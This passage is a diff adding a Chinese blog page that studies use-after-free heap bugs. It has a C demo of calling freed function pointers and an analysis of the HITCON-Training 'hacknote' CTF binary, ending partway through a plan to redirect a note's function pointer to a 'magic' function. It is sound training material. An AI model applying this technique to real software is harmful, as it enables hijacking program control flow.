@@ -1,0 +1,954 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/sakura.png">
+  <link rel="icon" href="/img/sakura.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="花時雨">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="原理Use After Free即其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况：  内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。 内存块被释放后，其对应的指针没有被设置为 NULL，但">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UAF学习记录">
+<meta property="og:url" content="https://hanashigure.github.io/2026/02/20/use-after-free-learning/index.html">
+<meta property="og:site_name" content="花時雨的流水账">
+<meta property="og:description" content="原理Use After Free即其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况：  内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。 内存块被释放后，其对应的指针没有被设置为 NULL，但">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hanashigure.github.io/images/uaf-hitcon-lab10/magic.png">
+<meta property="og:image" content="https://hanashigure.github.io/images/uaf-hitcon-lab10/uaf_exp.png">
+<meta property="og:image" content="https://hanashigure.github.io/images/uaf-hitcon-lab10/getshell.png">
+<meta property="article:published_time" content="2026-02-20T07:21:23.000Z">
+<meta property="article:modified_time" content="2026-02-21T12:45:30.910Z">
+<meta property="article:author" content="花時雨">
+<meta property="article:tag" content="Heap">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="UAF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://hanashigure.github.io/images/uaf-hitcon-lab10/magic.png">
+  
+  
+  
+  <title>UAF学习记录 - 花時雨的流水账</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="https://cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.7.0/style.min.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"hanashigure.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>花時雨的流水账</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="UAF学习记录"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-02-20 15:21" pubdate>
+          2026年2月20日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          53 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">UAF学习记录</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><code>Use After Free</code>即其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况：</p>
+<ul>
+<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
+<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>
+<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>
+</ul>
+<blockquote>
+<p>一般所指的Use After Free漏洞主要是后两种，一般将释放后没有被设置为NULL的内存指针为<strong>dangling pointer</strong></p>
+</blockquote>
+<h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><blockquote>
+<p>可以用ubuntu16来跑这个代码</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">name</span> &#123;</span><br>  <span class="hljs-type">char</span> *myname;<br>  <span class="hljs-type">void</span> (*func)(<span class="hljs-type">char</span> *str);<br>&#125; NAME;<br><span class="hljs-type">void</span> <span class="hljs-title function_">myprint</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span> &#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, str); &#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">printmyname</span><span class="hljs-params">()</span> &#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;call print my name\n&quot;</span>); &#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  NAME *a;<br>  a = (NAME *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> name));<br>  a-&gt;func = myprint;<br>  a-&gt;myname = <span class="hljs-string">&quot;I can also use it&quot;</span>;<br>  a-&gt;func(<span class="hljs-string">&quot;this is my function&quot;</span>);<br><br>  <span class="hljs-comment">// free without modify</span><br>  <span class="hljs-built_in">free</span>(a);<br>  a-&gt;func(<span class="hljs-string">&quot;I can also use it&quot;</span>);<br><br>  <span class="hljs-comment">// free with modify</span><br>  a-&gt;func = printmyname;<br>  a-&gt;func(<span class="hljs-string">&quot;this is my function&quot;</span>);<br><br>  <span class="hljs-comment">// set NULL</span><br>  a = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;this pogram will crash...\n&quot;</span>);<br>  a-&gt;func(<span class="hljs-string">&quot;can not be printed...&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>运行后观察到虽然我们 free 掉 a 指针，但是 a 指向的函数 myprint 依旧可以被调用，并且可以被修改为调用 printmyname，直到 a 被置为空以后才发生了 Segmention fault 。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">free</span>(a);<br>a-&gt;func(<span class="hljs-string">&quot;I can also use it&quot;</span>);<br><span class="hljs-comment">// free with modify</span><br>a-&gt;func = printmyname;<br>a-&gt;func(<span class="hljs-string">&quot;this is my function&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>看到myprint()函数依然可以被调用，并且成功执行打印出字符串。我们继续往下看,接下来不仅仅是对函数的调用了，而是直接将func成员变量中的函数指针更改成了printmyname()函数，并且调用func成员变量。虽然printmyname()函数不需要参数，但为了能够让程序认为这里依然是myprint()函数，并且认为我们的操作是合法的，所以传入了参数”this is my function”，再往后观察到，即使我们改变了成员变量中的函数指针，依然可以顺利执行printmyname()函数，并打印出printmyname()函数中原有打印“call print my name”的功能。  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// set NULL</span><br>a = <span class="hljs-literal">NULL</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;this pogram will crash...\n&quot;</span>);<br>a-&gt;func(<span class="hljs-string">&quot;can not be printed...&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>之后将a结构体置空，打印出一个提示字符串，这样一来程序再一次调用func成员变量，看到只出现了提示标语，而没有出现调用func成员变量执行printmyname()函数的功能。这样一个例子可以很直观的体现出结构体指针在释放之后置空的重要性，以及没有置空情况下我们可以做些什么。  </p>
+<h2 id="例题：-HITCON-Training-hacknote"><a href="#例题：-HITCON-Training-hacknote" class="headerlink" title="例题： HITCON-Training-hacknote"></a>例题： <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/use_after_free/hitcon-training-hacknote">HITCON-Training-hacknote</a></h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><h4 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">zer0ptr@DESKTOP-65QJLFA:~/Pwn/UAF$ checksec hacknote<br>[*] <span class="hljs-string">&#x27;/home/zer0ptr/Pwn/UAF/hacknote&#x27;</span><br>    Arch:       i386-32-little      <br>    RELRO:      Partial RELRO       <br>    Stack:      Canary found        <br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)  <br>    Stripped:   No<br></code></pre></td></tr></table></figure>
+
+<h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p><img src="/images/uaf-hitcon-lab10/magic.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里发现了一个魔法函数，记着应该有用。  </p>
+<h5 id="add-note"><a href="#add-note" class="headerlink" title="add_note()"></a>add_note()</h5><p>根据程序，我们可以看出程序最多可以添加 5 个 note。每个 note 有两个字段: <code>void (*printnote)();</code> 与<code>char *content;</code>，其中<code>printnote</code>会被设置为一个函数，其函数功能为输出 <code>content</code> 具体的内容。  </p>
+<p>note 的结构体定义如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">note</span> &#123;</span><br>  <span class="hljs-type">void</span> (*printnote)();<br>  <span class="hljs-type">char</span> *content;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>add_note 函数代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add_note</span><span class="hljs-params">()</span><br>&#123;<br>  note *v0; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [esp+10h] [ebp-18h]</span><br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [esp+14h] [ebp-14h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  <span class="hljs-keyword">if</span> ( count &lt;= <span class="hljs-number">5</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !notelist[i] )<br>      &#123;<br>        notelist[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8u</span>);<br>        <span class="hljs-keyword">if</span> ( !notelist[i] )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        notelist[i]-&gt;put = print_note_content;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Note size :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8u</span>);<br>        size = atoi(&amp;buf);<br>        v0 = notelist[i];<br>        v0-&gt;content = <span class="hljs-built_in">malloc</span>(size);<br>        <span class="hljs-keyword">if</span> ( !notelist[i]-&gt;content )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, notelist[i]-&gt;content, size);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success !&quot;</span>);<br>        ++count;<br>        <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v5;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Full&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v5;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>如果notelist+i是空字节则创建一个8字节的chunk，创建完成之后会在进行一次if判断，接着放置print_note_content()函数指针</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">print_note_content</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(*(<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)(a1 + <span class="hljs-number">4</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到print_note_content()会输出a1加四地址处的变量，接着读入buf并将buf的大小赋值到size并在v0+4的位置malloc一个size大小的空间</p>
+<blockquote>
+<p>程序会调用read函数将输入的内容放在<code>*((void **)*(&amp;notelist + i) + 1</code>处， 这里无法进行溢出</p>
+</blockquote>
+<h5 id="print-note"><a href="#print-note" class="headerlink" title="print_note()"></a>print_note()</h5><p>print_note 就是简单的根据给定的 note 的索引来输出对应索引的 note 的内容：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">print_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [esp+8h] [ebp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(&amp;buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= count )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( notelist[v1] )<br>    notelist[v1]-&gt;put(notelist[v1]);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h5 id="delete-note"><a href="#delete-note" class="headerlink" title="delete_note"></a>delete_note</h5><p>delete_note 会根据给定的索引来释放对应的 note。但是值得注意的是，在删除的时候，只是单纯进行了 free，而没有设置为 NULL，那么显然，这里是存在 Use After Free 的情况的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">del_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [esp+8h] [ebp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(&amp;buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= count )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( notelist[v1] )<br>  &#123;<br>    <span class="hljs-built_in">free</span>(notelist[v1]-&gt;content);<br>    <span class="hljs-built_in">free</span>(notelist[v1]);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ol>
+<li><p>释放<code>notelist+v1+1</code>处的chunk</p>
+</li>
+<li><p>然后释放<code>notelist+v1</code>处的chunk</p>
+</li>
+<li><p>free这两个chunk时chunk指针并没有被置空</p>
+</li>
+</ol>
+<h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1L8411m7xW/?spm_id_from=333.337.search-card.all.click&vd_source=302a892bb778bc77294aa18fcca329b7">l140w4n9 - Linux堆溢出Use After Free</a></p>
+<blockquote>
+<p>太懒了后面补上</p>
+</blockquote>
+<h4 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h4><blockquote>
+<p>通过 use after free 来使得这个程序执行 magic 函数：<strong>一个很直接的想法是修改 note 的<code>printnote</code>字段为 magic 函数的地址，从而实现在执行<code>printnote</code> 的时候执行 magic 函数</strong></p>
+</blockquote>
+<p>我们来看看如何实现：</p>
+<ol>
+<li>程序申请 8 字节内存用来存放 note 中的 printnote 以及 content 指针。</li>
+<li>程序根据输入的 size 来申请指定大小的内存，然后用来存储 content。</li>
+</ol>
+<p><img src="/images/uaf-hitcon-lab10/uaf_exp.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h5><ul>
+<li>申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li>
+<li>申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li>
+<li>释放 note0</li>
